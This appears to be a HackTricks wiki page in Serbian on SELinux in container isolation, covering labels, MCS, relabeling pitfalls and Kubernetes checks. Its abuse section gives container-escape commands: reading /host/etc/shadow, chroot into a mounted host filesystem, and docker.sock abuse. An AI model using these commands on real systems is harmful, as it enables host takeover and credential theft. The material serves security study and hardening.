# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux je **Mandatory Access Control zasnovan na oznakama**. Svaki relevantan proces i objekat može imati bezbednosni kontekst, a policy određuje koji domain-i mogu da komuniciraju sa kojim type-ovima i na koji način. U containerized okruženjima to obično znači da runtime pokreće container proces u okviru ograničenog container domain-a i označava sadržaj container-a odgovarajućim type-ovima. Ako policy ispravno funkcioniše, proces može da čita i upisuje ono što se očekuje da njegova oznaka dodiruje, dok mu je pristup drugom sadržaju host-a onemogućen, čak i ako taj sadržaj postane vidljiv kroz mount.

Ovo je jedna od najmoćnijih host-side zaštita dostupnih u mainstream Linux container deployment-ima. Posebno je važna na Fedora, RHEL, CentOS Stream, OpenShift i drugim SELinux-centric ekosistemima. U tim okruženjima, reviewer koji zanemari SELinux često neće razumeti zašto je naizgled očigledan put do kompromitovanja host-a zapravo blokiran.

## AppArmor Vs SELinux

Najlakše objašnjiva razlika na visokom nivou jeste da je AppArmor zasnovan na putanjama, dok je SELinux **zasnovan na oznakama**. To ima velike posledice po container security. Policy zasnovan na putanjama može da se ponaša drugačije ako isti sadržaj host-a postane vidljiv kroz neočekivanu mount putanju. Policy zasnovan na oznakama umesto toga proverava koja je oznaka objekta i šta process domain može da uradi sa njim. To SELinux ne čini jednostavnim, ali ga čini otpornim na određenu klasu pretpostavki zasnovanih na trikovima sa putanjama, koje defender-i ponekad slučajno prave u AppArmor-based sistemima.

Pošto je model orijentisan na oznake, obrada container volume-a i odluke o relabeling-u su security-critical. Ako runtime ili operator preširoko promeni oznake da bi „mount-ovi radili“, policy granica koja je trebalo da ograniči workload može postati znatno slabija nego što je predviđeno.

## Lab

Da biste proverili da li je SELinux aktivan na host-u:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Za pregled postojećих oznaka na hostu:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Za poređenje normalnog pokretanja sa onim u kojem je označavanje onemogućeno:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hostu sa omogućenim SELinux-om, ovo je veoma praktična demonstracija jer pokazuje razliku između workload-a koji se izvršava u očekivanom container domenu i onog iz kog je taj sloj enforcement-a uklonjen.

## Upotreba u runtime-u

Podman je posebno dobro usklađen sa SELinux-om na sistemima gde je SELinux deo podrazumevane platforme. Rootless Podman zajedno sa SELinux-om predstavlja jednu od najjačih mainstream osnova za containers, jer je proces već neprivilegovan na strani hosta, a i dalje ograničen MAC policy-jem. Docker takođe može da koristi SELinux tamo gde je podržan, iako ga administratori ponekad onemogućavaju kako bi zaobišli probleme sa volume labeling-om. CRI-O i OpenShift se u velikoj meri oslanjaju na SELinux kao deo svoje priče o container isolation-u. Kubernetes takođe može da izloži podešavanja povezana sa SELinux-om, ali njihova vrednost očigledno zavisi od toga da li node OS zaista podržava i primenjuje SELinux.<sup>[[2]](#references)</sup>

Pouka koja se stalno ponavlja jeste da SELinux nije opciona dekoracija. U ekosistemima koji su izgrađeni oko njega, on je deo očekivane security boundary. Za enumeraciju host-side policy-ja, analizu tranzicija i abuse SELinux administration alata pogledajte [opštu SELinux stranicu](../../../interesting-files-permissions/selinux.md).

## MCS kategorije i ponovno označavanje volume-a

Container isolation je obično kombinacija **type enforcement-a** i **Multi-Category Security (MCS)**. Dva procesa mogu oba da se izvršavaju kao `container_t`, ali da dobiju različite nivoe, kao što su `s0:c123,c456` i `s0:c321,c654`. Privatni sadržaj containera označen je kao `container_file_t` sa odgovarajućim kategorijama, tako da samo dolaženje do putanje drugog containera nije dovoljno za pristup. Runtime-i obično dodeljuju par kategorija; ručno ponovno korišćenje nivoa namerno uklanja ovu separaciju između pojedinačnih containera.<sup>[[3]](#references)</sup>

Uporedite process i mount labels umesto da proveravate samo type:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount sufiksi menjaju oznake inode-ova hosta i samim tim menjaju bezbednosnu granicu, a ne samo metapodatke mount-a:<sup>[[3]](#references)</sup>

- `:Z` primenjuje privatnu oznaku sa MCS kategorijama container-a. Prikladna je za volume u vlasništvu jednog container-a ili Pod-a.
- `:z` primenjuje deljenu oznaku kako bi i drugi ograničeni container-i mogli da koriste sadržaj (u zavisnosti od DAC dozvola). Njeno korišćenje za secrets ili podatke specifične za tenant-a uklanja MCS izolaciju koja bi inače razdvajala container-e.
- Relabeling je rekurzivan. Primena bilo koje opcije na široka stabla hosta, kao što su `/`, `/etc`, `/usr` ili celo home stablo, može istovremeno izložiti sadržaj izabranom container-u i zaustaviti host servise čije su očekivane oznake zamenjene.

Ručno ponovno korišćenje level-a lako se uočava u command line-ovima i manifestima. Sledeća dva container-a namerno dobijaju isti MCS level i zato mogu da koriste sadržaj označen za taj level:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Takođe razlikujte `label=nested` od `label=disable`: prvi izlaže SELinux operacije unutar containera i dozvoljava promene labela samo tamo gde ih policy dozvoljava, dok drugi uklanja razdvajanje labela za taj workload. Oba slučaja zahtevaju proveru, ali nisu ekvivalentna.<sup>[[3]](#references)</sup>

## Pogrešne konfiguracije

Klasična greška je `label=disable`. Operativno, do ovoga često dolazi zato što je mount volume-a bio odbijen, pa je najbrži kratkoročni odgovor bio uklanjanje SELinux-a iz jednačine umesto ispravljanja modela labeliranja.<sup>[[1]](#references)</sup> Druga česta greška je neispravno ponovno labeliranje sadržaja hosta. Široke operacije ponovnog labeliranja mogu omogućiti rad aplikacije, ali mogu i proširiti ono čemu container sme da pristupi daleko izvan prvobitne namene.

Takođe je važno ne mešati **instalirani** SELinux sa **efektivnim** SELinux-om. Host može podržavati SELinux, a ipak biti u permissive režimu, ili runtime možda ne pokreće workload u očekivanom domenu. U tim slučajevima zaštita je mnogo slabija nego što dokumentacija može sugerisati.

## Zloupotreba

Kada SELinux nije prisutan, radi u permissive režimu ili je široko onemogućen za workload, putanje mountovane sa hosta postaju mnogo lakše za zloupotrebu. Isti bind mount koji bi inače bio ograničen labelama može postati direktan put do podataka hosta ili do izmene hosta. Ovo je naročito relevantno u kombinaciji sa writable volume mountovima, direktorijumima container runtime-a ili operativnim prečicama koje su radi praktičnosti izložile osetljive putanje hosta.

SELinux često objašnjava zašto generički breakout writeup odmah funkcioniše na jednom hostu, ali uzastopno ne uspeva na drugom, iako flagovi runtime-a izgledaju slično. Sastojak koji nedostaje često uopšte nije namespace ili capability, već granica labela koja je ostala očuvana.

Najbrža praktična provera jeste poređenje aktivnog konteksta, a zatim ispitivanje mountovanih putanja hosta ili direktorijuma container runtime-a koji bi normalno bili ograničeni labelama:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ako je prisutan host bind mount, a SELinux labeling je onemogućen ili oslabljen, otkrivanje informacija često dolazi prvo:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ako je mount upisiv, a container je iz perspektive kernela praktično host-root, sledeći korak je testiranje kontrolisane izmene hosta umesto nagađanja:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostovima koji podržavaju SELinux, gubitak labela oko direktorijuma sa stanjem tokom izvršavanja može takođe izložiti direktne puteve za privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ove komande ne zamenjuju kompletan escape chain, ali vrlo brzo pokazuju da li je SELinux sprečavao pristup podacima na hostu ili izmenu fajlova na host strani.

### Pun primer: SELinux onemogućen + host mount sa dozvolom za upis

Ako je SELinux labeling onemogućen, a filesystem hosta mountovan sa dozvolom za upis na `/host`, potpuni host escape postaje uobičajen slučaj zloupotrebe bind-mount-a:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako `chroot` uspe, proces kontejnera sada radi iz hostovog sistema datoteka:
```bash
id
hostname
cat /etc/passwd | tail
```
### Potpuni primer: SELinux onemogućen + Runtime direktorijum

Ako workload može da pristupi runtime socketu nakon onemogućavanja labela, escape se može delegirati runtime-u:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Relevantno zapažanje je da je SELinux često bio kontrola koja je sprečavala upravo ovu vrstu pristupa putanjama hosta ili stanju runtime-a.

## Provere

Cilj SELinux provera je da potvrde da je SELinux omogućen, utvrde trenutni bezbednosni kontekst i provere da li su datoteke ili putanje koje vas zanimaju zaista ograničene oznakama.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Šta je ovde zanimljivo:

- `getenforce` bi idealno trebalo da vrati `Enforcing`; `Permissive` ili `Disabled` menjaju značenje celog odeljka o SELinux-u.
- Ako kontekst trenutnog procesa izgleda neočekivano ili preširoko, workload možda ne radi u okviru predviđene container policy.
- Ako host-mounted fajlovi ili runtime direktorijumi imaju labele kojima proces može da pristupa bez dovoljnog ograničenja, bind mount-ovi postaju mnogo opasniji.

Prilikom provere container-a na platformi koja podržava SELinux, labeling nemojte tretirati kao sporedan detalj. U mnogim slučajevima to je jedan od glavnih razloga zbog kojih host još nije kompromitovan.

## Runtime Defaults

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Zavisno od host-a | SELinux separation je dostupan na host-ovima sa omogućenim SELinux-om, ali tačno ponašanje zavisi od konfiguracije host-a/daemon-a | `--security-opt label=disable`, široko relabeling bind mount-ova, `--privileged` |
| Podman | Obično omogućen na SELinux host-ovima | SELinux separation je uobičajen deo Podman-a na SELinux sistemima, osim ako nije onemogućen | `--security-opt label=disable`, `label=false` u `containers.conf`, `--privileged` |
| Kubernetes | Dodeljuje ga runtime na SELinux čvorovima; može se eksplicitno konfigurisati | Runtime može da dodeli jedinstvenu labelu kada je Pod ne postavi. Eksplicitni `securityContext.seLinuxOptions` kontroliše Pod/volume label; na Kubernetes 1.37, eligible volume-i podrazumevano koriste SELinux mount labeling | duplirani MCS nivoi, permissive/disabled čvorovi, široko privilegovani workload-i, neselektivni `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | Obično se u velikoj meri oslanjaju na njega | SELinux je često ključni deo node isolation model-a u ovim okruženjima | custom policies koje previše proširuju pristup, onemogućavanje labeling-a radi kompatibilnosti |

SELinux defaults više zavise od distribucije nego seccomp defaults. Na Fedora/RHEL/OpenShift-style sistemima, SELinux je često centralni deo isolation model-a. Na sistemima koji ne koriste SELinux, on jednostavno nije prisutan.

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37 je učinio `SELinuxMount` stabilnim i podrazumevano ga omogućio. Za eligible PVC, Pod sa `seLinuxOptions` i CSI driver koji oglašava `.spec.seLinuxMount: true`, kubelet koristi `-o context=<label>` umesto da od runtime-a zahteva rekurzivni relabel svakog inode-a. Nepodržani driver-i i volume tipovi i dalje koriste rekurzivni put. Time se izbegava veliko relabel prolazak, kao i promena persistent labela svake datoteke samo da bi se volume izložio Pod-u.<sup>[[2]](#references)[[4]](#references)</sup>

Mount može da nosi samo jedan takav context. Zbog toga Pods sa **različitim SELinux labelama** koji koriste isti eligible volume na istom node-u više ne mogu istovremeno da rade uz podrazumevano `MountOption` ponašanje: jedan ostaje u stanju `ContainerCreating` uz grešku `conflicting SELinux labels of volume`. Ovo tretirajte i kao problem dostupnosti i kao koristan pokazatelj da su workload-i implicitno delili storage preko MCS granica. Ako je takvo deljenje namerno — na primer, privilegovani `spc_t` Pod i confined Pod koriste isti volume — per-Pod compatibility escape hatch je `seLinuxChangePolicy: Recursive`; nemojte ga primenjivati na nivou celog cluster-a bez razumevanja putanja koje će runtime relabel-ovati.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Korisne provere na strani klastera:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Opcioni kube-controller-manager `selinux-warning-controller` detektuje Pod-ove koji dele volume sa nekompatibilnim SELinux oznakama i izlaže metriku `selinux_warning_controller_selinux_volume_conflict`. Omogućite ga i pregledajte pre nadogradnji ili pre promene ponašanja označavanja volume-a; pomaže u razlikovanju stvarnog sukoba politika od uobičajenog CSI ili filesystem kvara.<sup>[[2]](#references)</sup>

## References

- [1] [Podman dokumentacija: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Konfigurisanje Security Context-a za Pod ili Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run dokumentacija: SELinux oznake i ponovno označavanje volume-a](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 izdanje: SELinuxMount i SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
